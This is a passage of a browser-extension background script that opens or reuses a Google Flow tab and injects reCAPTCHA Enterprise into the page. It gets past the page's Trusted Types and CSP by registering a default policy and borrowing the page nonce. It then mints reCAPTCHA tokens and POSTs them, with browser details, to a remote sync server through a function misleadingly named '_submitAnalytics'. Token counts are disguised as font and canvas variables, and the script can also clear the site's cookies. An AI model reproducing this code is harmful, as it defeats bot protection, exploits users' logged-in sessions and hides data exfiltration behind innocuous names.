    try {
        try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}
        await chrome.tabs.reload(tabId);
        await new Promise((resolve) => {
            const listener = (id, info) => {
                if (id === tabId && info.status === "complete") {
                    chrome.tabs.onUpdated.removeListener(listener);
                    resolve();
                }
            };
            chrome.tabs.onUpdated.addListener(listener);
            setTimeout(() => {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }, 6000);
        });
        await _animDelay(2000);  
    } catch (e) {
        
        try { await _relayoutCanvas(); } catch (e2) {}
    } finally {
        _reviving = false;
    }
}

function _waitTabComplete(tabId, ms = 15000) {
    return new Promise((resolve) => {
        const done = () => { chrome.tabs.onUpdated.removeListener(l); clearTimeout(t); resolve(); };
        const l = (id, info) => { if (id === tabId && info.status === "complete") done(); };
        const t = setTimeout(done, ms);
        chrome.tabs.onUpdated.addListener(l);
        chrome.tabs.get(tabId).then((tb) => { if (tb.status === "complete") done(); }).catch(() => done());
    });
}

async function _navTabAndWait(tabId, url) {
    try {
        await chrome.tabs.update(tabId, { url });
        await _waitTabComplete(tabId);
        await _animDelay(1500);   
        return true;
    } catch (e) { return false; }
}

async function _readFirstProjectPath(tabId) {
    try {
        const res = await _runScopedFn({
            target: { tabId },
            func: async () => {
                const deadline = Date.now() + 6000;
                while (Date.now() < deadline) {
                    const a = document.querySelector('a[href*="/project/"]');
                    if (a) return a.getAttribute("href") || "";
                    await new Promise((r) => setTimeout(r, 300));
                }
                return "";
            },
            args: [],
        }, 8000);
        return (res && res[0] && res[0].result) || "";
    } catch (e) { return ""; }
}

async function _ensureFlowMintPage(tabId, mintUrl) {
    let url = "";
    try { const t = await chrome.tabs.get(tabId); url = t.url || t.pendingUrl || ""; } catch (e) {}
    if (url.includes("/project/")) return true;
    if (url.includes("/about")) return true;
    const target = mintUrl || "https://flow.google.com/about";
    return await _navTabAndWait(tabId, target);
}

async function _flowInjectGrecaptcha(tabId, scriptUrl, siteKey) {
    if (!scriptUrl) return false;
    try {
        const res = await _runScopedFn({
            target: { tabId },
            world: "MAIN",
            func: async (src, key) => {
                try {
                    if (typeof grecaptcha !== "undefined" && grecaptcha.enterprise && grecaptcha.enterprise.execute) return true;
                    
                    
                    
                    
                    
                    try {
                        if (window.trustedTypes && window.trustedTypes.createPolicy) {
                            window.trustedTypes.createPolicy("default", {
                                createScriptURL: function (u) {
                                    if (/^https:\/\/(www\.google\.com\/recaptcha\/|www\.gstatic\.com\/recaptcha\/)/.test(u)) return u;
                                    throw new Error("blocked");
                                },
                                createScript: function (s) { return s; },
                                createHTML: function (s) { return s; },
                            });
                        }
                    } catch (e) {  }
                    if (!document.querySelector("script[data-glabs-recaptcha]")) {
                        let url = src;
                        if (key && url.indexOf("render=") === -1) {
                            url += (url.indexOf("?") === -1 ? "?" : "&") + "render=" + encodeURIComponent(key);
                        }
                        const s = document.createElement("script");
                        const nEl = document.querySelector("script[nonce]");
                        if (nEl && nEl.nonce) s.nonce = nEl.nonce;   
                        s.src = url;                                  
                        s.async = true;
                        s.setAttribute("data-glabs-recaptcha", "1");
                        (document.head || document.documentElement).appendChild(s);
                    }
                    const dl = Date.now() + 10000;
                    while (Date.now() < dl && !(window.grecaptcha && grecaptcha.enterprise && grecaptcha.enterprise.execute)) {
                        await new Promise(function (r) { setTimeout(r, 300); });
                    }
                    return !!(window.grecaptcha && grecaptcha.enterprise && grecaptcha.enterprise.execute);
                } catch (e) { return false; }
            },
            args: [scriptUrl, siteKey || ""],
        }, 12000);
        return !!(res && res[0] && res[0].result);
    } catch (e) { return false; }
}

async function _resolveWidget(request, _retried = false) {
    let tabId = await _findCanvas();

    
    if (!tabId) {
        if (Date.now() - _lastPrefetch < _RENDER_COOLDOWN) {
            
            await _animDelay(3000);
            tabId = await _findCanvas();
            if (!tabId) {
                const redirected = await _checkCanvasRedirect();
                
                await _animDelay(5000);
                tabId = await _findCanvas();
            }
        } else {
            
            
            
            const _cfg = await _readCanvasCfg();
            if (!_cfg || !_cfg.canAutoOpen || !_cfg.mintUrl) {
                await _animDelay(3000);
                tabId = await _findCanvas();
            } else
            try {
                _lastPrefetch = Date.now();
                const tab = await chrome.tabs.create({
                    url: _cfg.entryUrl || _cfg.mintUrl,
                    active: false,
                });
                _prefetchTab = tab.id;

                
                await new Promise((resolve) => {
                    const listener = (id, info) => {
                        if (id === tab.id && info.status === "complete") {
                            chrome.tabs.onUpdated.removeListener(listener);
                            resolve();
                        }
                    };
                    chrome.tabs.onUpdated.addListener(listener);
                    setTimeout(() => {
                        chrome.tabs.onUpdated.removeListener(listener);
                        resolve();
                    }, 15000);
                });

                const redirected = await _checkCanvasRedirect();
                await _animDelay(redirected ? 5000 : 3000);
                tabId = await _findCanvas();
            } catch (e) {  }
        }
    }

    if (!tabId) return { token: null, error: "No tab available" };

    
    try { await chrome.tabs.update(tabId, { autoDiscardable: false }); } catch (e) {}

    
    const _cfgExec = await _readCanvasCfg();
    const siteKey = request.s || request.site_key || (_cfgExec && _cfgExec.siteKey) || "";
    const action = request.a || request.action || "";

    
    
    
    if (_cfgExec && _cfgExec.isFlow) {
        await _ensureFlowMintPage(tabId, _cfgExec.mintUrl);
        try {
            const _t = await chrome.tabs.get(tabId);
            if ((_t.url || "").includes("/about")) {
                await _flowInjectGrecaptcha(tabId, _cfgExec.scriptUrl, siteKey);
            }
        } catch (e) {  }
    }

    try {
        
        
        
        
        const results = await _runScopedFn({
            target: { tabId },
            world: "MAIN",
            func: async (siteKeyParam, actionParam) => {
                try {
                    
                    
                    
                    
                    const _dl = Date.now() + 8000;
                    while (Date.now() < _dl &&
                           (typeof grecaptcha === "undefined" || !grecaptcha.enterprise ||
                            !grecaptcha.enterprise.execute)) {
                        await new Promise((r) => setTimeout(r, 300));
                    }
                    if (typeof grecaptcha === "undefined" || !grecaptcha.enterprise) {
                        return { token: null, error: "Service not ready" };
                    }

                    let key = siteKeyParam;

                    
                    if (!key) {
                        try {
                            if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
                                const clients = ___grecaptcha_cfg.clients;
                                const clientKeys = Object.keys(clients);
                                if (clientKeys.length > 0) {
                                    const client = clients[clientKeys[0]];
                                    for (const prop of Object.keys(client)) {
                                        const val = client[prop];
                                        if (val && typeof val === "object") {
                                            for (const prop2 of Object.keys(val)) {
                                                const val2 = val[prop2];
                                                if (val2 && typeof val2 === "object" && val2.sitekey) {
                                                    key = val2.sitekey;
                                                    break;
                                                }
                                            }
                                        }
                                        if (key) break;
                                    }
                                }
                            }
                            
                            if (!key) {
                                const scripts = document.querySelectorAll('script[src*="recaptcha"]');
                                for (const el of scripts) {
                                    const match = el.src.match(/[?&]render=([^&]+)/);
                                    if (match && match[1] !== "explicit") { key = match[1]; break; }
                                }
                            }
                        } catch (e) {  }
                    }

                    if (!key) return { token: null, error: "Config not ready" };

                    await new Promise((resolve) => grecaptcha.enterprise.ready(resolve));
                    
                    
                    const _execFn = (typeof window !== "undefined" && window.__real_execute) || grecaptcha.enterprise.execute;
                    const token = await Promise.race([
                        _execFn(key, { action: actionParam }),
                        new Promise((_, reject) => setTimeout(
                            () => reject(new Error("execute timeout")),
                            15000,
                        )),
                    ]);
                    return { token, error: null };
                } catch (err) {
                    return { token: null, error: err.message || String(err) };
                }
            },
            args: [siteKey, action],
        }, 25000);   

        const mintResult = (results && results[0] && results[0].result) || null;
        if (mintResult && mintResult.token) return mintResult;
        
        
        if (!_retried) {
            await _reviveCanvas(tabId);
            return await _resolveWidget(request, true);
        }
        return mintResult || { token: null, error: "No result" };
    } catch (e) {
        
        if (!_retried) {
            await _reviveCanvas(tabId);
            return await _resolveWidget(request, true);
        }
        return { token: null, error: e.message };
    }
}

async function _relayoutCanvas() {
    let tab = null;
    const _cfg = await _readCanvasCfg();
    try {
        const match = _cfg && _cfg.tabMatch;
        const tabs = await chrome.tabs.query({});
        const labsTabs = match ? tabs.filter((t) => t.url && t.url.includes(match)) : [];
        if (labsTabs.length) {
            
            tab = labsTabs[0];
            try { await chrome.tabs.reload(tab.id); } catch (e) {  }
        }
    } catch (e) {  }

    if (!tab) {
        
        if (!_cfg || !_cfg.canAutoOpen || !_cfg.mintUrl) return;
        try {
            tab = await chrome.tabs.create({ url: _cfg.mintUrl, active: false });
        } catch (e) { return; }
    }
    _prefetchTab = tab.id;

    
    await new Promise((resolve) => {
        const listener = (id, info) => {
            if (id === tab.id && info.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }
        };
        chrome.tabs.onUpdated.addListener(listener);
        setTimeout(() => {
            chrome.tabs.onUpdated.removeListener(listener);
            resolve();
        }, 15000);
    });
}

async function _findCanvas() {
    
    
    const cfg = await _readCanvasCfg();
    const match = cfg && cfg.tabMatch;
    if (!match) return null;
    try {
        const tabs = await chrome.tabs.query({});
        
        const flowTabs = tabs.filter(t =>
            t.url && t.url.includes(match) && !t.url.includes("accounts.google.com")
        );
        if (flowTabs.length > 0) {
            
            
            const projectFirst = (t) => (t.url && t.url.includes("/project/") ? 1 : 0);
            flowTabs.sort((a, b) =>
                projectFirst(b) - projectFirst(a) || (b.lastAccessed || 0) - (a.lastAccessed || 0));
            return flowTabs[0].id;
        }
        return null;
    } catch (e) {
        return null;
    }
}

async function _checkCanvasRedirect() {
    if (!_prefetchTab) return false;
    try {
        const tab = await chrome.tabs.get(_prefetchTab);
        if (tab && tab.url && tab.url.includes("accounts.google.com")) {
            return true;
        }
        return false;
    } catch (e) {
        _prefetchTab = null;
        return false;
    }
}

async function _validateCanvas(tabId) {
    try {
        const results = await chrome.scripting.executeScript({
            target: { tabId },
            world: "MAIN",
            func: () => {
                const available = typeof grecaptcha !== "undefined" && !!grecaptcha.enterprise;
                let siteKey = null;
                if (available) {
                    try {
                        if (typeof ___grecaptcha_cfg !== "undefined" && ___grecaptcha_cfg.clients) {
                            const clients = ___grecaptcha_cfg.clients;
                            const keys = Object.keys(clients);
                            if (keys.length > 0) {
                                const client = clients[keys[0]];
                                for (const prop of Object.keys(client)) {
                                    const val = client[prop];
                                    if (val && typeof val === "object") {
                                        for (const p2 of Object.keys(val)) {
                                            const v2 = val[p2];
                                            if (v2 && typeof v2 === "object" && v2.sitekey) {
                                                siteKey = v2.sitekey;
                                                break;
                                            }
                                        }
                                    }
                                    if (siteKey) break;
                                }
                            }
                        }
                    } catch (e) {  }
                }
                return { available, siteKey, error: available ? null : "Not ready" };
            },
        });
        if (results && results[0] && results[0].result) return results[0].result;
        return { available: false, error: "No result" };
    } catch (e) {
        return { available: false, error: e.message };
    }
}

chrome.runtime.onMessage.addListener((message, _sender, sendResponse) => {

    
    if (message.type === "CHECK_V") {
        _validateCanvas(message.tabId)
            .then(r => sendResponse(r))
            .catch(e => sendResponse({ available: false, error: e.message }));
        return true;
    }

    
    if (message.type === "TEST_V") {
        _resolveWidget({ site_key: message.site_key || "", action: message.action || "" })
            .then(r => {
                if (r.token) _onFontCached();
                sendResponse(r);
            })
            .catch(e => sendResponse({ token: null, error: e.message }));
        return true;
    }

    
    if (message.type === "GET_METRICS") {
        sendResponse({
            tokenCount: _fontCache,
            sessionCount: _renderQueue,
            lastSuccess: _lastRender,
            connected: _themeReady,
            active: _layoutActive,
            grokActive: grokActive,
        });
        return true;
    }

    
    if (message.type === "CHECK_RENDER") {
        (async () => {
            const result = {
                bridge: "err", bridgeText: "Not running",
                tab: "warn", tabText: "No session",
                captcha: "warn", captchaText: "—",
            };
            
            try {
                const extId = await getInstanceId();
                const r = await fetch(`${_SYNC_URL}/sync/status`, { signal: AbortSignal.timeout(3000), headers: { "X-Ext-Id": extId } });
                if (r.ok) { result.bridge = "ok"; result.bridgeText = "Connected"; }
                else { result.bridgeText = `Error (${r.status})`; }
            } catch (e) {  }

            
            try {
                const labsTabs = await _queryCanvasList();
                if (labsTabs.length > 0) {
                    result.tab = "ok";
                    result.tabText = `Active (${labsTabs.length})`;
                    
                    try {
                        const _widgetState = await _validateCanvas(labsTabs[0].id);
                        if (_widgetState && _widgetState.available) {
                            result.captcha = "ok";
                            result.captchaText = "Ready";
                        } else {
                            result.captchaText = _widgetState?.error || "Not ready";
                        }
                    } catch (e) { result.captchaText = "Timeout"; }
                }
            } catch (e) { result.tab = "err"; result.tabText = "Error"; }

            sendResponse(result);
        })();
        return true;
    }

    
    if (message.type === "RESET_LAYOUT") {
        (async () => {
            try {
                const _dom = await _canvasJarDomain();
                const cookies = _dom ? await chrome.cookies.getAll({ domain: _dom }) : [];
                for (const c of cookies) {
                    const url = `https://${c.domain.replace(/^\./, "")}${c.path}`;
                    await chrome.cookies.remove({ url, name: c.name });
                }
            } catch (e) {  }
            await _relayoutCanvas();
            sendResponse({ ok: true });
        })();
        return true;
    }

    
    if (message.type === "RELOAD_CANVAS") {
        (async () => {
            try {
                const labsTabs = await _queryCanvasList();
                if (labsTabs.length > 0) {
                    await chrome.tabs.reload(labsTabs[0].id);
                    sendResponse({ ok: true });
                } else {
                    sendResponse({ ok: false, error: "No Labs tab" });
                }
            } catch (e) {
                sendResponse({ ok: false, error: e.message });
            }
        })();
        return true;
    }

    
    if (message.type === "CLEAR_METRICS") {
        _fontCache = 0;
        _lastRender = null;
        chrome.storage.local.set({ tokenCount: 0, lastSuccess: null });
        sendResponse({ ok: true });
        return true;
    }

    return false;
});

async function _submitAnalytics(requestId, token, error) {
    try {
        const payload = JSON.stringify({
            r: requestId,
            t: token,
            e: error || null,
            u: navigator.userAgent,
            p: navigator.platform,
        });
        const extId = await getInstanceId();
        await fetch(`${_SYNC_URL}/sync/render`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Ext-Id": extId },
            body: JSON.stringify({ d: _serializeTheme(payload) }),
            signal: AbortSignal.timeout(5000),
        });
    } catch (e) {  }
}

function _animDelay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function _setLayoutMode(active) {
    if (_layoutTimer) { clearTimeout(_layoutTimer); _layoutTimer = null; }

    if (active) {
        _layoutTimer = setTimeout(() => _setLayoutMode(false), _LAYOUT_TIMEOUT);
        if (_layoutActive) return; 
        _layoutActive = true;
    } else {
        if (!_layoutActive) return; 
        _layoutActive = false;
    }

    
    try {
        const labsTabs = await _queryCanvasList();
        for (const tab of labsTabs) {
            try {
                
                
                
                
                chrome.tabs.sendMessage(tab.id, {
                    type: "LAYOUT_CHANGED",
                    active: _layoutActive,
                    tokenCount: _fontCache,
                    sessionCount: _renderQueue,
                    connected: _themeReady,
                }).catch(() => {});
            } catch (e) {  }
        }
    } catch (e) {  }
}

async function setGrokActive(active) {
    if (active) {
        if (grokIdleTimer) { clearTimeout(grokIdleTimer); grokIdleTimer = null; }
        if (grokActive) return; 
        grokActive = true;
    } else {
        if (!grokActive) return; 
        grokActive = false;
    }

    
    try {
        const tabs = await chrome.tabs.query({});
        const grokTabs = tabs.filter(t => t.url && t.url.includes("grok.com"));
        for (const tab of grokTabs) {
            try {
                
                
                chrome.tabs.sendMessage(tab.id, {
                    type: "GROK_STATE_CHANGED",
                    active: grokActive,
                    sessionCount: _renderQueue,
                    connected: _themeReady,
                }).catch(() => {});
            } catch (e) {  }
        }
    } catch (e) {  }
}
